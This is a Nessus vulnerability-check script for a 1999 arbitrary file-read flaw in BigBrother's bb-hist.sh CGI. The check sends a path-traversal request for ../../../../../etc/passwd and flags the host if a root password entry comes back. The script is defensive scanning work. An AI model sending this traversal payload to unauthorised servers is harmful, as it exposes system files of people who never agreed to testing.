#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10025);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CAN-1999-1462");
 script_bugtraq_id(142);
 
 script_name(english:"bb-hist.sh");
 script_description(
 	english:"It is possible to view arbitrary files on a system where versions 1.09b or
1.09c of 'BigBrother' are installed, using a flaw in the bb-hist.sh CGI
program.

Solution : Upgrade to version 1.09d or later.

Risk factor : High",

	francais:"Il est possible de lire des fichiers arbitraires sur
un système sur lequel les version 1.09b ou 1.09c de 'BigBrother' sont
installées, en utilisant un problème dans le programme cgi 'bb-hist.sh'.

Solution: Upgradez à la version 1.09d ou plus récente.

Facteur de risque : Elevé");

 script_summary(english:"Read arbitrary files using the CGI bb-hist.sh",
	 	francais:"Lit des fichiers arbitraires en utilisant le CGI bb-hist.sh");

 script_family(english:"CGI abuses", francais:"Abus de CGI");
  
 script_category(ACT_GATHER_INFO);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_copyright("Copyright (C) 1999 Renaud Deraison"); 
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);


foreach dir (cgi_dirs())
{
command = string(dir, "/bb-hist.sh?HISTFILE=../../../../../etc/passwd");
req = http_get(item:command, port:port);
flaw = 0;
buffer = http_keepalive_send_recv(port:port, data:req);
if( buffer == NULL ) exit(0);
if(egrep(pattern:"root:.*:0:[01]:.*", string:buffer))
   {
    security_hole(port);
    exit(0);
   }
}
